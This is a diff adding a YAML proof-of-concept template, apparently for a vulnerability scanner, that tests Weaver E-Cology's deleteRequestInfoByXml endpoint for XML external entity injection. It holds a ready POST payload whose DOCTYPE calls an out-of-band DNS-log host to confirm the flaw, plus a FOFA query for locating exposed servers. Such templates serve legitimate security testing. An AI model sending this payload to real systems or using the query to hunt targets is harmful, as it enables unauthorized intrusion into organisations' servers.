@@ -1,0 +1,24 @@
+id: poc-yaml-e-cology-deleterequestInfobyxml-xxe
+info:
+  name: 泛微E-Cology系统接口deleteRequestInfoByXml存在XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: e-cology
+  fofa: app="泛微-协同商务系统"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /rest/ofs/deleteRequestInfoByXml
+  headers:
+    Content-Type: application/xml
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <!DOCTYPE syscode SYSTEM "http://{{.reverseDomain}}.">
+
+    <M><syscode>&send;</syscode></M>'
+  expression: reverse.Verify()
+transport: http
